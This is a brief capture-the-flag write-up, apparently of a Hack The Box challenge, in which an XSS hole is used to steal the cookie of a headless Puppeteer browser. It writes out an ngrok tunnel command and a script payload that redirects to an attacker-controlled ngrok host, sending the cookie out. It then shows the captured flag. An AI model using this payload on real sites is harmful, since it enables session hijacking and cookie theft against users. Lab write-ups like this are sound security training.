**XSS**

There is a headless browser called puppeteer

![image](https://user-images.githubusercontent.com/87831546/144928352-c3793727-dc8d-4d8d-bc8e-1f0523a273eb.png)

Looks like there is a cookie that this browser uses that we need. The browser is visiting the web page we are on so we can try some XSS to steal the cookie on the only input in the site

Start ngrok as this is a public ip
```
./ngrok http 1234
```
Enter the payload
```
<script>document.location='http://7325-5-151-121-251.ngrok.io/?cookie='+document.cookie</script>
```
![image](https://user-images.githubusercontent.com/87831546/144928385-84d97cfd-2f1b-44c4-98f5-225787a39658.png)

And we get the cookie in our listener
![image](https://user-images.githubusercontent.com/87831546/144928395-76aba58e-42b3-451d-88ee-b39306fc69e9.png)

```
HTB{3v1l_3lv3s_4r3_r1s1ng_up!}
```
